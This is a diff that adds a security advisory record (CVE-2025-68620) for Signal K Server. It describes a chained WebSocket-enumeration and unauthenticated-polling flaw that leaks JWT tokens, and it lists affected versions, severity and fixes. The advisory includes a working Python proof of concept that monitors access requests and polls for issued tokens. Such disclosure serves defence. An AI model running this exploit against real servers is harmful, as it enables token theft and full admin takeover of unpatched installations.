@@ -1,0 +1,306 @@
+advisory_id: GHSA-fq56-hvg6-wvm5
+datasource_id: github_osv/GHSA-fq56-hvg6-wvm5
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-fq56-hvg6-wvm5/GHSA-fq56-hvg6-wvm5.json
+aliases:
+  - CVE-2025-68620
+summary: "Signal K Server vulnerable to JWT Token Theft via WebSocket Enumeration and Unauthenticated\
+  \ Polling\nSignalK Server exposes two features that can be chained together to steal JWT authentication\
+  \ tokens without any prior authentication. The attack combines WebSocket-based request enumeration\
+  \ with unauthenticated polling of access request status.\n\n**Unauthenticated WebSocket Request\
+  \ Enumeration**: When a WebSocket client connects to the SignalK stream endpoint with the\
+  \ `serverevents=all` query parameter, the server sends all cached server events including\
+  \ `ACCESS_REQUEST` events that contain details about pending access requests. The `startServerEvents`\
+  \ function iterates over `app.lastServerEvents` and writes each cached event to any connected\
+  \ client without verifying authorization level. Since WebSocket connections are allowed for\
+  \ readonly users (which includes unauthenticated users when `allow_readonly` is true), attackers\
+  \ receive these events containing request IDs, client identifiers, descriptions, requested\
+  \ permissions, and IP addresses.\n\n**Unauthenticated Token Polling**: The access request\
+  \ status endpoint at `/signalk/v1/access/requests/:id` returns the full state of an access\
+  \ request without requiring authentication. When an administrator approves a request, the\
+  \ response includes the issued JWT token in plaintext. The `queryRequest` function returns\
+  \ the complete request object including the token field, and the REST endpoint uses readonly\
+  \ authentication, allowing unauthenticated access.\n\nAn attacker has two paths to exploit\
+  \ these vulnerabilities:\n\n1. The attacker creates their own access request (using the IP\
+  \ spoofing vulnerability to craft a convincing spoofed request), then polls their own request\
+  \ ID until an administrator approves it, receiving the JWT token.\n\n2. The attacker passively\
+  \ monitors the WebSocket stream to discover request IDs from legitimate devices, then polls\
+  \ those IDs and steals the JWT tokens when administrators approve them, hijacking legitimate\
+  \ device credentials.\n\nBoth paths require zero authentication and enable complete authentication\
+  \ bypass.\n\n### Affected Code\n\n**File**: `src/events.ts` (lines 40-43)\n\n```typescript\n\
+  Object.keys(app.lastServerEvents).forEach((propName) => {\n  spark.write(app.lastServerEvents[propName])\n\
+  })\n```\n\nAll cached server events, including `ACCESS_REQUEST`, are sent to any connected\
+  \ WebSocket client without permission checks.\n\n**File**: `src/tokensecurity.js` (lines 946-948)\n\
+  \n```javascript\nstrategy.getAccessRequestsResponse = () => {\n  return filterRequests('accessRequest',\
+  \ 'PENDING')\n}\n```\n\nThis function returns all pending requests with full details, which\
+  \ is then broadcast as a server event.\n\n**File**: `src/requestResponse.js` (lines 108-135)\n\
+  \n```javascript\nfunction createReply(request, state, props) {\n  const reply = {\n    state:\
+  \ state,\n    requestId: request.requestId\n  }\n\n  if (request.updateCb) {\n    props.forEach((prop)\
+  \ => {\n      if (typeof request[prop] !== 'undefined') {\n        reply[prop] = request[prop]\
+  \  // Includes 'token' when approved\n      }\n    })\n  }\n  return reply\n}\n```\n\nWhen\
+  \ an access request transitions to COMPLETED state with APPROVED permission, the token is\
+  \ included in the reply object.\n\n**File**: `src/interfaces/rest.js` (endpoint registration)\n\
+  \nThe `/signalk/v1/access/requests/:id` endpoint uses readonly authentication, allowing unauthenticated\
+  \ access when `allow_readonly` is true.\n\n### Impact\n\nAn attacker can obtain any JWT token\
+  \ issued by the server without authentication. By exploiting the social engineering vulnerability\
+  \ to request admin permissions, they receive a fully privileged admin token granting access\
+  \ to all protected endpoints including package installation, effectively bypassing authentication\
+  \ entirely. Additionally, attackers can hijack legitimate device credentials by stealing tokens\
+  \ intended for real devices.\n\n### PoC\n\n```python\nimport json, websocket, requests, time\n\
+  \nTARGET_IP, TARGET_PORT = \"localhost\", 3000\nTARGET_WS = f\"ws://{TARGET_IP}:{TARGET_PORT}\"\
+  \nTARGET_HTTP = f\"http://{TARGET_IP}:{TARGET_PORT}\"\n\ndef poll_for_token(request_id, href):\n\
+  \    print(f\"[*] Polling started for request {request_id}\")\n    url = f\"{TARGET_HTTP}{href}\"\
+  \n    while True:\n        try:\n            r = requests.get(url)\n            \n       \
+  \     if r.status_code == 200:\n                data = r.json()\n                state = data.get(\"\
+  state\")\n                print(f\"[.] Request {request_id} state: {state}\")\n          \
+  \      \n                if state == \"COMPLETED\":\n                    access_req = data.get(\"\
+  accessRequest\", {})\n                    permission = access_req.get(\"permission\")\n  \
+  \                  token = access_req.get(\"token\")\n                    \n             \
+  \       print(f\"[*] Request completed - Permission: {permission}, Token present: {bool(token)}\"\
+  )\n                    \n                    if token:\n                        print(f\"\
+  [+] TOKEN STOLEN\")\n                        print(f\"[+] Permission: {permission}\")\n  \
+  \                      print(f\"[+] JWT Token: {token}\")\n                        return\
+  \ token\n                    else:\n                        print(f\"[-] Request {request_id}\
+  \ denied or no token\")\n                        return None\n            else:\n        \
+  \        print(f\"[-] HTTP {r.status_code} for request {request_id}\")\n                 \
+  \       \n        except Exception as e:\n            print(f\"[-] Error polling {request_id}:\
+  \ {e}\")\n            \n        time.sleep(5)\n\ndef monitor_and_steal_tokens():\n    uri\
+  \ = f\"{TARGET_WS}/signalk/v1/stream?serverevents=all\"\n    print(f\"[*] Connecting to {uri}\"\
+  )\n    \n    ws = websocket.create_connection(uri)\n    print(\"[+] Connected, monitoring\
+  \ for ACCESS_REQUEST events...\")\n    \n    while True:\n        message = ws.recv()\n  \
+  \      msg = json.loads(message)\n        \n        if msg.get(\"type\") == \"ACCESS_REQUEST\"\
+  :\n            print(\"[+] ACCESS_REQUEST event received!\")\n            data = msg.get(\"\
+  data\", [])\n            \n            if data:\n                req = data[0]\n         \
+  \       request_id = req.get('requestId')\n                permissions = req.get('clientRequest',\
+  \ {}).get('permissions')\n                href = req.get('href', f'/signalk/v1/requests/{request_id}')\n\
+  \                \n                print(f\"[*] Found request: {request_id}\")\n         \
+  \       print(f\"[*] Closing WebSocket and starting polling...\")\n                \n    \
+  \            ws.close()\n                poll_for_token(request_id, href)\n              \
+  \  break\n\nif __name__ == \"__main__\":\n    monitor_and_steal_tokens()\n```\n\n### Recommendations\n\
+  \n1. Require strict authentication for all WebSocket channels. The `serverevents=all` parameter\
+  \ should only be accessible to authenticated admin users. Unauthenticated or readonly users\
+  \ should not receive any server events.\n2. Place `ACCESS_REQUEST` events behind strict authentication.\
+  \ Even if other server events are available to readonly users, access request details must\
+  \ only be sent to authenticated administrators.\n3. Implement client verification so only\
+  \ the original requester can retrieve their token\n4. Consider delivering tokens through a\
+  \ separate secure channel rather than the polling endpoint"
+impacted_packages:
+  - purl: pkg:npm/signalk-server
+    affected_versions: vers:npm/<2.19.0
+    fixed_versions: vers:npm/2.19.0
+    affected_packages:
+      - pkg:npm/signalk-server@0.1.24
+      - pkg:npm/signalk-server@0.1.27
+      - pkg:npm/signalk-server@0.1.28
+      - pkg:npm/signalk-server@0.1.29
+      - pkg:npm/signalk-server@0.1.30
+      - pkg:npm/signalk-server@0.1.31
+      - pkg:npm/signalk-server@0.1.32
+      - pkg:npm/signalk-server@1.0.0-0
+      - pkg:npm/signalk-server@1.0.0-1
+      - pkg:npm/signalk-server@1.0.0-2
+      - pkg:npm/signalk-server@1.0.0-3
+      - pkg:npm/signalk-server@1.0.0-4
+      - pkg:npm/signalk-server@1.0.0
+      - pkg:npm/signalk-server@1.1.0
+      - pkg:npm/signalk-server@1.1.1
+      - pkg:npm/signalk-server@1.1.2
+      - pkg:npm/signalk-server@1.2.0
+      - pkg:npm/signalk-server@1.2.1
+      - pkg:npm/signalk-server@1.2.2
+      - pkg:npm/signalk-server@1.2.3
+      - pkg:npm/signalk-server@1.2.4
+      - pkg:npm/signalk-server@1.3.0
+      - pkg:npm/signalk-server@1.4.0
+      - pkg:npm/signalk-server@1.4.1
+      - pkg:npm/signalk-server@1.4.2
+      - pkg:npm/signalk-server@1.4.3
+      - pkg:npm/signalk-server@1.5.0
+      - pkg:npm/signalk-server@1.6.0
+      - pkg:npm/signalk-server@1.7.0
+      - pkg:npm/signalk-server@1.7.1
+      - pkg:npm/signalk-server@1.8.0
+      - pkg:npm/signalk-server@1.9.0
+      - pkg:npm/signalk-server@1.9.1
+      - pkg:npm/signalk-server@1.10.0
+      - pkg:npm/signalk-server@1.10.1
+      - pkg:npm/signalk-server@1.10.2
+      - pkg:npm/signalk-server@1.11.0
+      - pkg:npm/signalk-server@1.12.0
+      - pkg:npm/signalk-server@1.13.0
+      - pkg:npm/signalk-server@1.13.1
+      - pkg:npm/signalk-server@1.14.0
+      - pkg:npm/signalk-server@1.15.0
+      - pkg:npm/signalk-server@1.16.0
+      - pkg:npm/signalk-server@1.17.0
+      - pkg:npm/signalk-server@1.18.0-beta.1
+      - pkg:npm/signalk-server@1.18.0-beta.2
+      - pkg:npm/signalk-server@1.18.0-beta.3
+      - pkg:npm/signalk-server@1.18.0-beta.4
+      - pkg:npm/signalk-server@1.18.0-beta.5
+      - pkg:npm/signalk-server@1.18.0-beta.6
+      - pkg:npm/signalk-server@1.18.0
+      - pkg:npm/signalk-server@1.19.0-beta.1
+      - pkg:npm/signalk-server@1.19.0-beta.2
+      - pkg:npm/signalk-server@1.19.0
+      - pkg:npm/signalk-server@1.20.0
+      - pkg:npm/signalk-server@1.21.0
+      - pkg:npm/signalk-server@1.22.0
+      - pkg:npm/signalk-server@1.23.0
+      - pkg:npm/signalk-server@1.24.0
+      - pkg:npm/signalk-server@1.25.0
+      - pkg:npm/signalk-server@1.26.0
+      - pkg:npm/signalk-server@1.27.0
+      - pkg:npm/signalk-server@1.27.1
+      - pkg:npm/signalk-server@1.28.0-beta.1
+      - pkg:npm/signalk-server@1.28.0
+      - pkg:npm/signalk-server@1.29.0-beta.1
+      - pkg:npm/signalk-server@1.29.0
+      - pkg:npm/signalk-server@1.30.0
+      - pkg:npm/signalk-server@1.31.0
+      - pkg:npm/signalk-server@1.32.0
+      - pkg:npm/signalk-server@1.33.0-beta.1
+      - pkg:npm/signalk-server@1.33.0
+      - pkg:npm/signalk-server@1.34.0
+      - pkg:npm/signalk-server@1.35.0
+      - pkg:npm/signalk-server@1.35.1
+      - pkg:npm/signalk-server@1.35.2
+      - pkg:npm/signalk-server@1.36.0-beta.1
+      - pkg:npm/signalk-server@1.36.0-beta.2
+      - pkg:npm/signalk-server@1.36.0-beta.3
+      - pkg:npm/signalk-server@1.36.0
+      - pkg:npm/signalk-server@1.37.0-beta.1
+      - pkg:npm/signalk-server@1.37.0-beta.3
+      - pkg:npm/signalk-server@1.37.0
+      - pkg:npm/signalk-server@1.37.1
+      - pkg:npm/signalk-server@1.37.2
+      - pkg:npm/signalk-server@1.37.3
+      - pkg:npm/signalk-server@1.37.4
+      - pkg:npm/signalk-server@1.37.5
+      - pkg:npm/signalk-server@1.37.6
+      - pkg:npm/signalk-server@1.38.0
+      - pkg:npm/signalk-server@1.38.1
+      - pkg:npm/signalk-server@1.39.0
+      - pkg:npm/signalk-server@1.40.0
+      - pkg:npm/signalk-server@1.41.0-beta.2
+      - pkg:npm/signalk-server@1.41.0-beta.3
+      - pkg:npm/signalk-server@1.41.0-beta.4
+      - pkg:npm/signalk-server@1.41.0
+      - pkg:npm/signalk-server@1.41.1
+      - pkg:npm/signalk-server@1.41.2
+      - pkg:npm/signalk-server@1.41.3
+      - pkg:npm/signalk-server@1.42.0
+      - pkg:npm/signalk-server@1.43.0
+      - pkg:npm/signalk-server@1.44.0
+      - pkg:npm/signalk-server@1.45.0
+      - pkg:npm/signalk-server@1.46.2
+      - pkg:npm/signalk-server@1.46.3
+      - pkg:npm/signalk-server@2.0.0-beta.1
+      - pkg:npm/signalk-server@2.0.0-beta.2
+      - pkg:npm/signalk-server@2.0.0-beta.5
+      - pkg:npm/signalk-server@2.0.0-beta.6
+      - pkg:npm/signalk-server@2.0.0-beta.7
+      - pkg:npm/signalk-server@2.0.0-beta.9
+      - pkg:npm/signalk-server@2.0.0-beta.11
+      - pkg:npm/signalk-server@2.0.0-beta.12
+      - pkg:npm/signalk-server@2.0.0
+      - pkg:npm/signalk-server@2.1.0
+      - pkg:npm/signalk-server@2.1.1
+      - pkg:npm/signalk-server@2.2.0
+      - pkg:npm/signalk-server@2.3.0-beta.2
+      - pkg:npm/signalk-server@2.3.0-canboatv2.1
+      - pkg:npm/signalk-server@2.3.0
+      - pkg:npm/signalk-server@2.3.1
+      - pkg:npm/signalk-server@2.4.0
+      - pkg:npm/signalk-server@2.4.1
+      - pkg:npm/signalk-server@2.5.0
+      - pkg:npm/signalk-server@2.6.0
+      - pkg:npm/signalk-server@2.6.1
+      - pkg:npm/signalk-server@2.6.2
+      - pkg:npm/signalk-server@2.7.0
+      - pkg:npm/signalk-server@2.7.1
+      - pkg:npm/signalk-server@2.7.2
+      - pkg:npm/signalk-server@2.8.0
+      - pkg:npm/signalk-server@2.8.1
+      - pkg:npm/signalk-server@2.8.2
+      - pkg:npm/signalk-server@2.8.3
+      - pkg:npm/signalk-server@2.9.0
+      - pkg:npm/signalk-server@2.10.0
+      - pkg:npm/signalk-server@2.11.0
+      - pkg:npm/signalk-server@2.12.0
+      - pkg:npm/signalk-server@2.13.0-beta.1
+      - pkg:npm/signalk-server@2.13.0-beta.2
+      - pkg:npm/signalk-server@2.13.0-beta.3
+      - pkg:npm/signalk-server@2.13.0
+      - pkg:npm/signalk-server@2.13.1
+      - pkg:npm/signalk-server@2.13.2
+      - pkg:npm/signalk-server@2.13.3
+      - pkg:npm/signalk-server@2.13.4
+      - pkg:npm/signalk-server@2.13.5
+      - pkg:npm/signalk-server@2.14.0-beta.1
+      - pkg:npm/signalk-server@2.14.0
+      - pkg:npm/signalk-server@2.14.1
+      - pkg:npm/signalk-server@2.14.2
+      - pkg:npm/signalk-server@2.14.3
+      - pkg:npm/signalk-server@2.14.4
+      - pkg:npm/signalk-server@2.15.0-beta.1
+      - pkg:npm/signalk-server@2.15.0-beta.2
+      - pkg:npm/signalk-server@2.15.0-beta.3
+      - pkg:npm/signalk-server@2.15.0-beta.4
+      - pkg:npm/signalk-server@2.15.0-beta.5
+      - pkg:npm/signalk-server@2.15.0-beta.6
+      - pkg:npm/signalk-server@2.15.0
+      - pkg:npm/signalk-server@2.15.1
+      - pkg:npm/signalk-server@2.15.2
+      - pkg:npm/signalk-server@2.15.3
+      - pkg:npm/signalk-server@2.16.0
+      - pkg:npm/signalk-server@2.17.0
+      - pkg:npm/signalk-server@2.17.2
+      - pkg:npm/signalk-server@2.18.0
+      - pkg:npm/signalk-server@2.19.0-beta.1
+      - pkg:npm/signalk-server@2.19.0-beta.2
+      - pkg:npm/signalk-server@2.19.0-beta.4
+      - pkg:npm/signalk-server@2.19.0-beta.5
+    fixed_packages:
+      - pkg:npm/signalk-server@2.19.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/signalk/signalk-server
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/signalk/signalk-server
+        commit: 221aff6cd89c56308084d1781b3abbf938605bd3
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-fq56-hvg6-wvm5/GHSA-fq56-hvg6-wvm5.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-288
+references:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/commit/221aff6cd89c56308084d1781b3abbf938605bd3
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-68620
+    reference_type:
+    reference_id: CVE-2025-68620
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-fq56-hvg6-wvm5
+    reference_type:
+    reference_id: GHSA-fq56-hvg6-wvm5
+exploits: []
